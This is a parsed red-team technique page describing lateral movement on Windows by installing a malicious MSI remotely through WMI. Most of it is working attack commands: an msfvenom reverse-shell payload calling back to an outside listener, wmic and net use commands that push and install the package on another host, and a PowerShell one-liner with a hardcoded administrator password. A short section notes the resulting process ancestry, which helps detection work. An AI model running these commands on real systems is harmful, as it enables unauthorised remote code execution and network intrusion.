---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# WMI + MSI Lateral Movement

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-wmi-msi-lateral-movement` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/wmi-+-msi-lateral-movement.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Generating malicious payload in MSI (Microsoft Installer Package):

## Preserved Body

````markdown
## Execution

Generating malicious payload in MSI (Microsoft Installer Package):
```csharp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil64.msi
```
![](<../../_assets/Screenshot from 2018-10-19 17-31-00.png>)

I tried executing the .msi payload like so, but got a return code `1619` and a quick search on google returned nothing useful:
```csharp
wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLocation='\\10.0.0.2\c$\experiments\evil64.msi'
```
![](<../../_assets/Screenshot from 2018-10-19 18-45-55.png>)

I had to revert to a filthy way of achieving the goal:
```csharp
net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.msi \\10.0.0.7\c$\PerfLogs\setup.msi ; wmic /node:10.0.0.7 /user:administrator@offense product call install PackageLocation=c:\PerfLogs\setup.msi
```
![](<../../_assets/Peek 2018-10-19 18-41.gif>)

Additionally, the same could of be achieved using powershell cmdlets:
```csharp
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential (Get-Credential)
```
Get a prompt for credentials:

![](<../../_assets/Screenshot from 2018-10-19 19-02-10.png>)

and enjoy the code execution:

![](<../../_assets/Screenshot from 2018-10-19 19-02-48.png>)

Or if no GUI is available for credentials, a oneliner:
```csharp
$username = 'Administrator';$password = '123456';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential $credential
```
![](<../../_assets/Screenshot from 2018-10-19 19-09-42.png>)

## Observations

Note the process ancestry: `services > msiexec.exe > .tmp > cmd.exe`:

![](<../../_assets/Screenshot from 2018-10-19 18-46-37.png>)

and that the connection is initiated by the .tmp file (I ran another test, hence another file name):

![](<../../_assets/Screenshot from 2018-10-19 18-55-53.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/wmi-msi-lateral-movement.md)

## Evidence Excerpt

```text
_asset_filenames:
- Peek 2018-10-19 18-41.gif
- Screenshot from 2018-10-19 17-31-00.png
- Screenshot from 2018-10-19 18-45-55.png
- Screenshot from 2018-10-19 18-46-37.png
- Screenshot from 2018-10-19 18-55-53.png
- Screenshot from 2018-10-19 19-02-10.png
- Screenshot from 2018-10-19 19-02-48.png
```
